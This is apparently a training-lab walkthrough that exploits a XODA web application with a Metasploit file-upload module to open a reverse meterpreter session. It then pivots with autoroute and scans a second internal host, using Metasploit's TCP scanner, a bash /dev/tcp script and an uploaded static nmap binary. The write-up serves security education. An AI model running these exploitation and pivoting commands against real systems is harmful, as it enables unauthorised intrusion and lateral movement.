# Network Service Scanning
1. Check if the target machine is reachable:
   ```
   ping -c 4 demo1.ine.local
   ```
   ![image](https://github.com/user-attachments/assets/ff8f8865-6d62-485e-b22a-0ad98c4fec77)

2. We can now perform a default Nmap port scan on the target to identify the open ports on the target system, this can be done by running the following command:
   ```
   nmap demo1.ine.local
   ```
   ![image](https://github.com/user-attachments/assets/9e9581f6-533a-48c7-91af-9d62bd3c071c)

3. Check the HTTP content hosted on port 80 of the target machine
   ```
   curl demo1.ine.local
   ```
   As mentioned in the challenge, a XODA web app instance is running on the system which can be exploited using the “exploit/unix/webapp/xoda_file_upload” Metasploit module.
   ![image](https://github.com/user-attachments/assets/ebc12817-c13b-4510-a89a-6d561be52e26)

4. Start msfconsole and select the mentioned module and set the parameter values
   ```
   use exploit/unix/webapp/xoda_file_upload
   set RHOSTS demo1.ine.local
   set TARGETURI /
   set LHOST 192.63.4.2
   exploit
   ```
   ![image](https://github.com/user-attachments/assets/c98b97a8-7819-432d-b251-d76e5a1828c5)

5. A meterpreter session is spawned on the target machine. Start a command shell and identify the IP address range of the second target machine.
   ```
   shell
   ip addr
   ```
   ![image](https://github.com/user-attachments/assets/d4a61b2d-08ef-4b52-a7c7-02227fc0ae8e)

6. The IP address of the first target machine on its eth1 interface is 192.180.108.2, the second target machine will be located at 192.180.108.3 on the second network.
   Add the route to Metasploit's routing table
   ```
   run autoroute -s 192.180.108.2
   ```
   ![image](https://github.com/user-attachments/assets/51bd26de-f399-427e-ad49-b8f1a158014f)

7. Background the current meterpreter session and use the portscan tcp module of Metasploit to scan the second target machine. Press CTRL+z and Enter y to background the meterpreter session.
   ```
   use auxiliary/scanner/portscan/tcp
   set RHOSTS 192.180.108.3
   set verbose false
   set ports 1-1000
   exploit
   ```
   ![image](https://github.com/user-attachments/assets/26755772-8fec-4111-9938-48a63aea697c)

8. Check the static binaries available in the "/usr/bin/" directory.
   ```
   ls -al /root/static-binaries/nmap
   file /root/static-binaries/nmap
   ```
   ![image](https://github.com/user-attachments/assets/903cc066-017d-417d-aaa6-3f5859c61500)


9. Background the Metasploit session and create a bash port scanning script. Press CTRL+z to background the Metasploit session. Using the script provided at [https://catonmat.net/tcp-port-scanner-in-bash] as a reference, create a bash script to scan the first 1000 ports
   ```
   #!/bin/bash
   for port in {1..1000}; do
   timeout 1 bash -c "echo >/dev/tcp/$1/$port" 2>/dev/null && echo "port $port is open"
   done
   ```
   Save the script as bash-port-scanner.sh
   ![image](https://github.com/user-attachments/assets/613d7a47-01a4-4008-b987-6dd7c133a159)

10. Foreground the Metasploit session and switch to the meterpreter session. Press "fg" and press enter to foreground the Metasploit session.
    ```
    sessions -i 1
    ```
    ![image](https://github.com/user-attachments/assets/f2cc2c6a-cb08-4c87-aa5e-d345b86a8b34)

11. Upload the nmap static binary and the bash port scanner script to the target machine.
    ```
    upload /root/static-binaries/nmap /tmp/nmap
    upload /root/bash-port-scanner.sh /tmp/bash-port-scanner.sh
    ```
    ![image](https://github.com/user-attachments/assets/dc38b651-ac15-4698-add6-bdddb71fe0f0)

12. Make the binary and script executable and use the bash script to scan the second target machine.
    ```
    shell
    cd /tmp/
    chmod +x ./nmap ./bash-port-scanner.sh
    ./bash-port-scanner.sh 192.180.108.3
    ```
    ![image](https://github.com/user-attachments/assets/a1a8a2f6-3ae0-4d07-b5c2-93d1e19a766f)

13. Three ports are open on the target machine, ports 21, 22 and 80. Using the nmap binary, scan the target machine for open ports.
    ```
    ./nmap -p- 192.180.108.3
    ```
    ![image](https://github.com/user-attachments/assets/981f8fca-bcd4-4936-8d0a-8e6522266ba6)
    
    The services running on the target machine are FTP, SSH and HTTP.




